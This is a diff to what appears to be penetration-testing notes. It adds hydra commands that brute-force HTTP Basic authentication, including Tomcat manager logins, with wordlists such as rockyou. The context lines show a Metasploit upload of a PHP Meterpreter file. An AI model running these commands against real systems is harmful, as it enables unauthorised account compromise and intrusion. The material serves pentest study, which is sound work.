@@ -267,3 +267,26 @@ Web enumeration means to look out info about services running on port, versions,
 		msf>auxiliary (http_put) > set filename meter.php
 		msf>auxiliary (http_put) > set filedata file://root/Desktop/meter.php
 		msf>auxiliary (http_put) > exploit
+		
+## HTTP Basic Authentication Brute Force
+	# hydra -L /opt/user.txt -P /opt/password.txt 192.168.0.104 http-head "/test"
+
+	# hydra -L /opt/user.txt -P /opt/password.txt -s 80 -f 192.168.0.104 http-head "/test"
+
+	# hydra -L /opt/user.txt -P /opt/password.txt -s 80 -f 192.168.0.104 http-get "/test"
+
+	# hydra -L /opt/user.txt -P /opt/password.txt http-get://192.168.0.104/test
+
+	# hydra -L /opt/user.txt -P /opt/password.txt http-post://192.168.0.104/test
+
+	# hydra -L apache_tomcat_users.txt -P apache_tomcat_passwords.txt -s 8080 -f 192.168.0.203 http-get/manager
+
+	# hydra -L apache_tomcat_users.txt -P apache_tomcat_passwords.txt http-get://192.168.0.203:8080/manager
+
+	# hydra -L apache_tomcat_users.txt -P apache_tomcat_passwords.txt http-head://192.168.0.203:8080/manager
+
+	# hydra -L apache_tomcat_users.txt -P apache_tomcat_passwords.txt -s 8080 192.168.0.203 http-head "/manager"
+
+	# hydra -L tomcat -P apache_tomcat_passwords.txt -s 8080 192.168.0.203 http-head "/manager/html"
+		
+	# hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.106 http-head
